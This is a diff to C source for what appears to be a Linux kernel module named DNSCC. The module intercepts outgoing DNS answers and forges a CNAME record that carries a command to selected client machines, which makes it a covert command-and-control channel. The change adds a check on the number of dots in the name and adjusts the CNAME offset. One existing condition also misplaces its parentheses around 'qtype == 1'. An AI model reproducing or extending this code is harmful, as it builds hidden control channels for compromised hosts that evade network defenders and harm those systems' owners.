@@ -322,6 +322,25 @@ unsigned char* read_dns_name(unsigned char* reader, unsigned char* buffer, int* 
 	return name;
 }
 
+/* we do not want to inser a command between domain.tld and A record so return 0 if we find only 1 dot in the question */
+
+uint8_t can_manipulate_dns_reply(unsigned char* dns_name){
+	int i;
+	int dot_found = 0;
+        for(i=0;i<strlen(dns_name);i++){
+                if(dns_name[i] == '.'){
+                        dot_found++;
+                }
+        }
+	if(dot_found >= 2){
+		return 1;
+	}else{
+		return 0;
+	}
+
+}
+
+/* Insert a fake cname betweek question_domain <-> A record */
 uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsigned char* new_dns_data,uint16_t orig_len){
 	struct DNS_HEADER *dns_h,*ndns_h;
 	unsigned char *qname, *nqname;
@@ -400,7 +419,7 @@ uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsig
 	/* we should really use compression, so our fake cname will look like command.something.com
 	 * get the place of the dot before the last one.
 	 */
-	cname_offset = 0;
+	cname_offset = 1;
 	last_dot = 0;
 	for(i=0;i<strlen(dns_name);i++){
 //		printk(KERN_INFO" i=%d dns_name %c",i,dns_name[i]);
@@ -597,7 +616,7 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 		printk(KERN_INFO "[DNSCC] Outgoing DNS answer packet id %u dns-name %s answer = %d \n",ntohs(dns_h->query_id),dns_name,query_bit);
 		/* check if we need to send out a command to this client and the reply is an A record*/
 		printk(KERN_INFO"Check command %d qtype %d",check_command_exists(iph->daddr),ntohs(question_data->qtype==1));
-		if(check_command_exists(iph->daddr) == 1 && ntohs(question_data->qtype == 1)){
+		if(check_command_exists(iph->daddr) == 1 && ntohs(question_data->qtype == 1) && can_manipulate_dns_reply(dns_name) == 1){
 			/* Manipulate the answer */
 			unsigned char *command;
 			unsigned char *orig_dns_data;
